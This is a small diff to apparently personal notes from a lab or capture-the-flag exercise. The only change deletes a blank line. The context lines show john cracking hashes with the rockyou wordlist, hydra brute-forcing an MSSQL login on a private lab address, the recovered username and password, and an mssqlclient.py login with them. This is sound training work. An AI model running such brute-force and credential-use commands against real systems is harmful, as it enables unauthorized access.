@@ -154,7 +154,6 @@ john --wordlist=~/rockyou.txt hash_founded.txt
 
 # PART II - Challenge 8  💬ANSWER: 7💬
 hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql -u -t 8 -w 5 
-
 ### INFO: [1433] [mssql] host: 192.168.10.144 login: Server_mssrv password: Spidy
 find / -type f -name 'mssqlclient.py' 2>/dev/null
 mssqlclient.py Server_mssrv:Spidy@192.168.10.144 -port 1433
